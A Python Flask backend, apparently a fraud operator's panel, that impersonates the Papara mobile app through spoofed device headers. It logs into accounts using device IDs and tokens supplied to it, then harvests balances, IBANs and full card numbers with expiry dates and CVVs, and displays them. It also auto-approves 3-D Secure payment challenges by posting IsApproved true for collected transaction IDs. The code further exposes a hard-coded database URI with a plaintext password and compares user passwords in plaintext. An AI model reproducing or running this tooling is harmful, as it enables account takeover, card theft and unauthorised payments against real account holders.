import requests
from flask import Flask, render_template, request, jsonify
from flask_login import LoginManager, login_user, UserMixin, current_user, login_required
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import func
from sqlalchemy.exc import NoResultFound

app = Flask(__name__)

app.config['SECRET_KEY'] = 'your_secret_key'
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://admin:isIris82745506@database-2.cxmisosi48au.ap-southeast-2.rds.amazonaws.com/papara?charset=utf8mb4'  # 示例数据库
login_manager = LoginManager(app)
login_manager.login_view = 'login'  # 设置登录视图
db = SQLAlchemy(app)

# 登录管理器，加载用户

class Threshold(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user = db.Column(db.String(255), unique=True, nullable=False)  # 确保 user 是唯一的
    threshold = db.Column(db.Integer, nullable=False)


# 用户模型
class User(db.Model, UserMixin):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(128), nullable=False)


# 定义 Balance 表的模型
class Balance(db.Model):
    # 定义字段
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), nullable=True)
    balance = db.Column(db.String(255), nullable=True)
    iban = db.Column(db.String(255), nullable=True)



# 定义 ids 表的模型
class ids(db.Model):
    # 定义字段
    id = db.Column(db.Integer, primary_key=True)
    acsTransID = db.Column(db.String(255), nullable=True)
    user = db.Column(db.String(255), nullable=True)
    used = db.Column(db.String(255), nullable=True,default=0)
    # 自动为 createtime 字段设置当前时间
    createtime = db.Column(db.DateTime, nullable=False, default=func.now())

# 定义 ids 表的模型
class device(db.Model):
    # 定义字段
    id = db.Column(db.Integer, primary_key=True)
    device_id = db.Column(db.String(255), nullable=True)
    user = db.Column(db.String(255), nullable=True)
    createtime = db.Column(db.DateTime, nullable=False, default=func.now())


class DeviceID(db.Model):
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    device_id = db.Column(db.String(255), nullable=True)
    token = db.Column(db.Text, nullable=True)
    fileplace = db.Column(db.String(255), nullable=True)


# 定义 account_detail 表的模型
class AccountDetail(db.Model):
    # 定义字段
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    iban = db.Column(db.String(255), nullable=True)
    device_id = db.Column(db.String(255), nullable=True)
    file_name = db.Column(db.String(255), nullable=True)
    balance = db.Column(db.String(255), nullable=True)
    limit = db.Column(db.String(255), nullable=True)
    last_time = db.Column(db.DateTime, nullable=True)
    card_count = db.Column(db.Integer, nullable=True)
    used = db.Column(db.Integer, nullable=True)


class cards(db.Model):
    # 定义字段
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    device_id = db.Column(db.String(255), nullable=True)
    card_id = db.Column(db.String(255), nullable=True)
    card_number = db.Column(db.String(255), nullable=True)
    card_data = db.Column(db.String(255), nullable=True)
    cvv = db.Column(db.String(255), nullable=True)
    last_deal_data = db.Column(db.DateTime, nullable=True)
    enable=db.Column(db.Integer, nullable=True)


@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))  # 确保返回的是 User 对象，而不是整数

def get_header(device, token):


    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'p': '2',
        'X-Papara-App-Version': '3.10.36',
        'X-Papara-App-Build': '351',
        'X-Papara-App-Platform': 'Android',
        'X-Papara-App-Device-Manufacturer': 'samsung',
        'X-Papara-App-Device-Description': 'SM-G955N',
        'X-Papara-App-Device-Identifier': device,
        'X-Resource-Language': 'en-US',
        'X-Papara-App-Dark-Mode-Enabled': 'false',
        'X-Papara-App-Device-System-Version': '25',
        'X-IsNfcSupported': 'false',
        'X-IsVoiceOverRunning': 'false',
        'User-Agent': 'Papara/Android/3.10.36',
        'Host': 'api.papara.com',
        'Connection': 'Keep-Alive',
    }
    datas = {"password": "113245", "deviceId": device, "isNfcSupported": 'false', "platform": 2,
             "referenceCode": "", "source": 0}
    headers['token'] = token
    result = requests.post(
        'https://api.papara.com/login/mobilelogin',
        data=datas,
        headers=headers)
    if result.status_code == 200:
        data = result.json()
        access_token = data['data']['access_token']
        headers['Authorization'] = f"Bearer {access_token}"

    return headers

def get_detail(device, token,file_name):

    headers=get_header(device, token)

    result = requests.get(
        'https://api.papara.com/balance',
        headers=headers)

    if result.status_code == 200:
        data = result.json()
        totalBalance = data['data']['balances'][0]['totalBalance']
        iban = data['data']['balances'][0]['iban']

    data = {"page": 1, "pageSize": 20}
    result = requests.post(
        'https://api.papara.com/user/ledgers',
        data=data,
        headers=headers)
    if result.status_code == 200:
        data = result.json()
        lasttime = data['data']['items'][0]['createdAt']


    result = requests.get(
            url='https://api.papara.com/user/accountdetails/0',
            headers=headers)
    if result.status_code == 200:
        data = result.json()
        limit = data['data']['remainingDefinedLimit']

    result = requests.get(
        'https://api.papara.com/paparacard/cards',
        headers=headers)
    if result.status_code == 200:
        data = result.json()
        ids = [card['id'] for card in data['data']]
        for card_id in ids:
            url=f"https://api.papara.com/paparacard/{card_id}"
            result = requests.get(
                    url=url,
                    headers=headers)
            data = result.json()
            # 提取 cardNumber, expiryMonth, expiryYear 和 cvv
            card_number = data['data']['cardNumber']
            expiry_month = data['data']['expiryMonth']
            expiry_year = data['data']['expiryYear']
            cvv = data['data']['cvv']
            enable=data['data']['internetTransactionsEnabled']
            data = {"cardId": card_id, "page": 1, "pageSize": 20}
            result = requests.post(
                    url='https://api.papara.com/user/ledgers',
                    headers=headers,
                    data=data)
            data = result.json()
            last_deal_data=data['data']['items'][0]['createdAt']

            new_card= cards(
                device_id=device,
                card_id=card_id,
                card_number=str(card_number),
                card_data=str(expiry_month)+'/'+str(expiry_year),
                cvv=cvv,
                enable=enable,
                last_deal_data=last_deal_data,

            )
            db.session.add(new_card)
    account = AccountDetail.query.filter_by(device_id=device).first()

    if account:
        account.total_balance = totalBalance
    else:
        new_account = AccountDetail(
            device_id=device,
            balance=totalBalance,
            file_name=file_name,
            card_count=len(ids),
            iban=iban,
            last_time=lasttime,
            limit=limit
        )
        db.session.add(new_account)
    db.session.commit()


def updata_balance(device_id, header):
    account = Balance.query.filter_by(device_id=device_id).first()
    result = requests.get(
        'https://api.papara.com/balance',
        headers=header)
    if result.status_code == 200:
        data = result.json()
        totalBalance = data['data']['balances'][0]['totalBalance']
        iban = data['data']['balances'][0]['iban']
        account.balance = totalBalance
        account.iban = iban
        db.session.commit()


# def add_detail(device_id, header):
#     account = DeviceID.query.filter_by(device_id=device_id).first()
#     header = get_header(device_id, account.toen)
#     result = requests.get(
#         'https://api.papara.com/balance',
#         headers=header)
#     if result.status_code == 200:
#         data = result.json()
#         totalBalance = data['data']['balances'][0]['totalBalance']
#         iban = data['data']['balances'][0]['iban']
#         account.balance = totalBalance
#         account.iban = iban


# 路由：从数据库获取数据并返回 JSON 格式
@app.route('/detail', methods=['GET'])
def get_users():
    # 获取分页参数
    page = request.args.get('page', 1, type=int)
    limit = request.args.get('limit', 10, type=int)

    ibannumber = request.args.get('ibannumber')  # 设备ID
    filename = request.args.get('filename')  # 文件名
    devicedids = request.args.get('devicedids')  # 文件名
    # 查询数据库
    acc_query = AccountDetail.query
    if ibannumber:
        acc_query = acc_query.filter_by(iban=ibannumber)
    if filename:
        acc_query = acc_query.filter_by(file_name=filename)
    if devicedids:
        acc_query = acc_query.filter_by(device_id=devicedids)

    acc_query=acc_query.paginate(page=page, per_page=limit, error_out=False)
    acc = acc_query.items

    # 将数据库对象转换为字典
    users_data = []
    for user in acc:
        users_data.append({
            'id':user.id,
            'iban': user.iban,
            'device': user.device_id,
            'file': user.file_name,
            'balance': user.balance,
            'limit': user.limit,
            'enable': user.used,
            'count': user.card_count,
            'lasttime': user.last_time
        })

    return jsonify({
        'code': 0,  # 状态码，Layui 表格要求 '0' 表示成功
        'msg': '',
        'count': acc_query.total,  # 数据总数，用于分页
        'data': users_data  # 实际数据
    })


@app.route('/')
def index():
    return render_template('login.html')


@app.route('/space')
def space():
    return render_template('view/system/space.html')


@app.route('/add')
def add():
    return render_template('view/system/operate/add.html')


@app.route('/card_details/<string:device_id>', methods=['GET'])
def card_details(device_id):
    return render_template('view/document/card_detail.html', device_id=device_id)


# API 接口用于返回卡片数据
@app.route('/api/card_detail/<string:device_id>', methods=['GET'])
def api_card_detail(device_id):
    # 根据 device_id 查找卡片数据
    card_info = cards.query.filter_by(device_id=device_id).all()

    if card_info:
        card_data = []
        for card in card_info:
            card_data.append({
                'device_id': card.device_id,
                'number': card.card_number,
                'cvv': card.cvv,
                'data': card.card_data,
                'lasttime': card.last_deal_data,
                'enable':card.enable
            })
        return jsonify({
            'code': 0,  # 状态码，Layui 表格要求 '0' 表示成功
            'msg': '',
            'count': len(card_data),
            'data': card_data  # 实际数据
        })
    else:
        return jsonify({'error': 'No card found for this device'}), 404


@app.route('/add_device', methods=['POST'])
def add_device():
    data = request.get_json()
    device_id = data.get('Device-Id')
    token = data.get('Token')
    fileplace = data.get('file-Name')
    quary = DeviceID.query.filter_by(device_id=device_id).first()
    if quary :
        return jsonify({'success': False, 'msg': 'Papara账户已存在'})
    get_detail(device_id,token,fileplace)
    new_device = DeviceID(device_id=device_id, token=token, fileplace=fileplace)
    try:
        db.session.add(new_device)
        db.session.commit()
        return jsonify({'success': True, 'msg': 'Papara账户添加成功'})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'msg': f'Error: {str(e)}'}), 500
    return


@app.route('/login', methods=['POST'])
def login():
    data = request.form
    username = data.get('username')
    password = data.get('password')
    print(username, password)
    # 查询数据库中的用户
    user = User.query.filter_by(username=username).first()
    print(user)
    if username == user.username and password == user.password:  # 简单示例逻辑
        login_user(user)
        # 如果验证成功
        response = {
            'success': True,
            'msg': '登录成功！'
        }
        return jsonify(response)  # 返回JSON响应
    else:
        # 如果验证失败
        response = {
            'success': False,
            'msg': '用户名或密码错误！'
        }
        return jsonify(response)  # 返回JSON响应


@app.route('/console1')
def console1():
    return render_template('view/console/console1.html')


@app.route('/table')
def table():
    return render_template('view/document/table.html')


@app.route('/index')
def index_main():
    return render_template('index.html')

def get_device_ids(user):
    results = device.query.filter(device.user == user).all()
    return [d.device_id for d in results]


def add_device_id(device_id, user):
    # 查询当前用户的所有设备
    user_devices = device.query.filter_by(user=user).order_by(device.createtime).all()

    # 如果设备数量超过3，则删除最旧的设备
    if len(user_devices) >= 3:
        # 删除最旧的设备（即按创建时间最早的设备）
        old_device = user_devices[0]
        db.session.delete(old_device)
        db.session.commit()  # 提交删除

    # 添加新的设备
    new_device = device(device_id=device_id, user=user)

    try:
        db.session.add(new_device)
        db.session.commit()
        return jsonify({'success': True, 'msg': 'Device added successfully'})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'msg': f'Error: {str(e)}'}), 500


@app.route('/<user>/receive_device/<string:device_id>', methods=['GET'])
def receive_device(user, device_id=None):
    if request.method == 'POST':
        data = request.get_json()
        device_id = data.get('device_id')
    if device_id:
        add_device_id(device_id, user)
        # 不立即处理 acsTransID，而是等达到阈值或手动触发
        return jsonify({"status": f"device_id 已更新 for user {user}"}), 200
    return jsonify({"error": "请求中没有 device_id"}), 400

def add_acsTransID(acsTransID, user):
    new_acsTransID = ids(acsTransID=acsTransID, user=user)
    try:
        db.session.add(new_acsTransID)
        db.session.commit()
        return True
    except Exception as e:
        db.session.rollback()
        return False
    return


def send_post_request(acsTransID, device_id, user):
    # 默认使用Android请求头部
    headers = {
        'Content-Type': 'application/json; charset=UTF-8',
        'p': '2',
        'X-Papara-App-Version': '3.13.0',
        'X-Papara-App-Build': '395',
        'X-Papara-App-Platform': 'Android',
        'X-Papara-App-Device-Manufacturer': 'VIVO',
        'X-Papara-App-Device-Description': 'LYA-AL111',
        'X-Papara-App-Device-Identifier': device_id,
        'X-Resource-Language': 'en-US',
        'X-Papara-App-Dark-Mode-Enabled': 'false',
        'X-Papara-App-Device-System-Version': '18',
        'X-IsNfcSupported': 'false',
        'X-IsVoiceOverRunning': 'false',
        'User-Agent': 'Papara/Android/3.13.0',
        'Host': 'api.papara.com',
        'Connection': 'Keep-Alive',
    }

    json_data = {
        'AcsTransID': acsTransID,
        'IsApproved': True,
    }

    try:
        result = requests.post(
            'https://api.papara.com/acs/challengeresult',
            headers=headers,
            json=json_data)

        if result.status == 200:
            message = f"成功发送POST请求，AcsTransID: {acsTransID}，Device ID: {device_id}，User: {user}"
            print(message)
            return {"status": "success", "message": message}
        else:
            # 如果不是 200 状态码，返回空消息
            return {"status": "error", "message": None}
    except Exception as e:
        # 如果发生异常，返回空消息
        print(f"发送POST请求时出错: {e}")
        return {"status": "error", "message": None}

def mark_acsTransID_as_used(acsTransID, user):
    try:
        # 查询符合条件的记录
        record = ids.query.filter_by(acsTransID=acsTransID, user=user).first()

        # 如果找到了记录，则更新 used 字段为 1
        if record:
            record.used = 1
            db.session.commit()  # 提交更改
            return {"status": "success", "message": f"{acsTransID} 已标记为已使用"}
        else:
            return {"status": "error", "message": f"{acsTransID} 未找到"}
    except NoResultFound:
        return {"status": "error", "message": f"{acsTransID} 的记录不存在"}
    except Exception as e:
        db.session.rollback()  # 如果发生错误，回滚事务
        return {"status": "error", "message": str(e)}


# 获取用户的 threshold，若不存在则返回默认值
def get_user_threshold(user, default_value=1):
    # 从数据库查询 user 的 threshold
    record = Threshold.query.filter_by(user=user).first()

    if record:
        return record.threshold  # 返回数据库中的阈值
    else:
        return default_value  # 如果用户不存在，返回默认值

def process_unprocessed_acsTransIDs(user, force=False):
    device_ids = get_device_ids(user)
    messages = []
    if not device_ids:
        no_device_message = f"没有可用的设备ID for user {user}"
        print(no_device_message)
        messages.append(no_device_message)  # 返回无可用设备ID的消息
        return messages

    acsTransIDs = ids.query.filter(ids.user == user, ids.used == 0).all()
    acsTransIDs = [d.acsTransID for d in acsTransIDs]
    print(acsTransIDs)
    threshold = int(get_user_threshold(user))

    if force or len(acsTransIDs) >= threshold:
        tasks = []
        for acsTransID in acsTransIDs:
            for device_id in device_ids:
                result = send_post_request(acsTransID, device_id, user)
                messages.append(result["message"])  # 保存所有的消息（成功或失败）
                mark_acsTransID_as_used(acsTransID, user)

    return messages  # 返回所有请求的消息


@app.route('/<user>/set_threshold/<int:threshold>', methods=['GET'])
def set_threshold(user, threshold):
    # 检查用户是否已存在
    existing_record = Threshold.query.filter_by(user=user).first()

    if existing_record:
        # 如果用户存在，更新阈值
        existing_record.threshold = threshold
        db.session.commit()
        return jsonify({"status": f"用户 {user} 的阈值已更新为 {threshold}"}), 200
    else:
        # 如果用户不存在，创建新记录
        new_threshold = Threshold(user=user, threshold=threshold)
        db.session.add(new_threshold)
        db.session.commit()
        return jsonify({"status": f"用户 {user} 的阈值已创建并设置为 {threshold}"}), 201

@app.route('/<user>/receive/<string:acsTransID>', methods=['GET'])
def receive(user, acsTransID=None):
    if request.method == 'POST':
        data = request.get_json()
        acsTransID = data.get('acsTransID')
        force = data.get('force', False)
    else:
        force = False

    if acsTransID:
        if add_acsTransID(acsTransID, user):
            # 检查是否立即处理
            print(force)
            process_unprocessed_acsTransIDs(user, force=force)
            return jsonify({"status": f"收到 acsTransID for user {user}"}), 200
        else:
            return jsonify({"status": f"重复的 acsTransID 已忽略 for user {user}"}), 200
    return jsonify({"error": "请求中没有 acsTransID"}), 400

@app.route('/3ds_detail')
def ds_detail():
    return render_template('view/document/3ds_table.html')

@app.route('/process_now', methods=['GET'])
def process_now():
    username = current_user.username
    process_unprocessed_acsTransIDs(username, force=True)
    return jsonify({"status": f"已立即处理用户 {username} 的未处理 acsTransID"}), 200


@app.route('/api/use_deviced_detail', methods=['GET'])
def use_deviced_detail():
    username = current_user.username
    devices=device.query.filter_by(user=username).all()
    devices_data = []
    if devices:
        for dev in devices:
            devices_data.append({
                'user': username,
                'deviced_id': dev.device_id,
                'createTime': dev.createtime
            })
    return jsonify({
        'code': 0,  # 状态码，Layui 表格要求 '0' 表示成功
        'msg': '',
        'count': len(devices_data),
        'data': devices_data  # 实际数据
    })

@app.route('/api/3ds_detail', methods=['GET'])
@login_required
def get_3ds_detail():
    username = current_user.username
    # print(username)
    acsTransIDs = ids.query.filter(ids.user == username, ids.used == 0).all()
    acsTransIDs_data = []
    if acsTransIDs:
        for card in acsTransIDs:
            print(card.acsTransID,card.createtime)
            acsTransIDs_data.append({
                'user': username,
                'acsTransID': card.acsTransID,
                'createTime': card.createtime
            })
    return jsonify({
        'code': 0,  # 状态码，Layui 表格要求 '0' 表示成功
        'msg': '',
        'count': len(acsTransIDs_data),
        'data': acsTransIDs_data  # 实际数据
    })

@app.route('/refresh_card', methods=['POST'])
def refresh_card():
    data = request.get_json()
    device_id = data.get('id')
    device=DeviceID.query.filter_by(device_id=device_id).first()
    headers=get_header(device_id,device.token)

    result = requests.get(
        'https://api.papara.com/paparacard/cards',
        headers=headers)
    if result.status_code == 200:
        data = result.json()
        ids = [card['id'] for card in data['data']]
        for card_id in ids:
            url=f"https://api.papara.com/paparacard/{card_id}"
            result = requests.get(
                    url=url,
                    headers=headers)
            data = result.json()
            enable=data['data']['internetTransactionsEnabled']
            data = {"cardId": card_id, "page": 1, "pageSize": 20}
            result = requests.post(
                    url='https://api.papara.com/user/ledgers',
                    headers=headers,
                    data=data)
            data = result.json()
            last_deal_data=data['data']['items'][0]['createdAt']
            existing_card=cards.query.filter_by(card_id=card_id).first()
            existing_card.enable = enable
            existing_card.last_deal_data = last_deal_data
            db.session.commit()
    return jsonify({
        'success': True,
    })





@app.route('/refresh_account', methods=['POST'])
def refresh_account():
    data = request.get_json()
    device_id = data.get('id')
    device=DeviceID.query.filter_by(device_id=device_id).first()
    # print(device.token)
    headers=get_header(device_id,device.token)

    result = requests.get(
        'https://api.papara.com/balance',
        headers=headers)

    if result.status_code == 200:
        data = result.json()
        totalBalance = data['data']['balances'][0]['totalBalance']

    data = {"page": 1, "pageSize": 20}
    result = requests.post(
        'https://api.papara.com/user/ledgers',
        data=data,
        headers=headers)
    if result.status_code == 200:
        data = result.json()
        lasttime = data['data']['items'][0]['createdAt']


    result = requests.get(
            url='https://api.papara.com/user/accountdetails/0',
            headers=headers)
    if result.status_code == 200:
        data = result.json()
        limit = data['data']['remainingDefinedLimit']

    existing_acc=AccountDetail.query.filter_by(device_id=device_id).first()
    existing_acc.balance=totalBalance
    existing_acc.limit=limit
    existing_acc.last_time=lasttime
    db.session.commit()
    return jsonify({
        'success': True,
        'data': {
            'total_balance': totalBalance,
            'limit': limit,
            'lasttime':lasttime
        }
    })

@app.route('/process', methods=['POST'])
def process():
    data = request.get_json()
    device_id = data.get('id')
    username = current_user.username
    print(device_id,username)
    messages=[]
    acsTransIDs = ids.query.filter(ids.user == username, ids.used == 0).all()
    acsTransIDs = [d.acsTransID for d in acsTransIDs]
    for acsTransID in acsTransIDs:
            result = send_post_request(acsTransID, device_id, username)
            messages.append(result["message"])  # 保存所有的消息（成功或失败）
            mark_acsTransID_as_used(acsTransID, username)
    return jsonify({
        'success': True,
        'data': {
            'msg': messages,
        }
    })


@app.route('/remove/<string:id>', methods=['DELETE'])
def remove(id):
    try:
        # 查找 device 对应的记录
        acc_record = AccountDetail.query.filter_by(id=id).first()

        if acc_record:
            # 从数据库中删除记录
            db.session.delete(acc_record)
            db.session.commit()

            return jsonify({"success": True, "msg": "账号已成功删除"}), 200
        else:
            return jsonify({"success": False, "msg": "账号未找到"}), 404

    except Exception as e:
        db.session.rollback()
        return jsonify({"success": False, "msg": f"删除设备时发生错误: {str(e)}"}), 500

@app.route('/remove_device/<string:id>', methods=['DELETE'])
def remove_device(id):
    try:
        # 查找 device 对应的记录
        acc_record = device.query.filter_by(device_id=id).first()

        if acc_record:
            # 从数据库中删除记录
            db.session.delete(acc_record)
            db.session.commit()

            return jsonify({"success": True, "msg": "账号已成功删除"}), 200
        else:
            return jsonify({"success": False, "msg": "账号未找到"}), 404

    except Exception as e:
        db.session.rollback()
        return jsonify({"success": False, "msg": f"删除设备时发生错误: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(debug=True)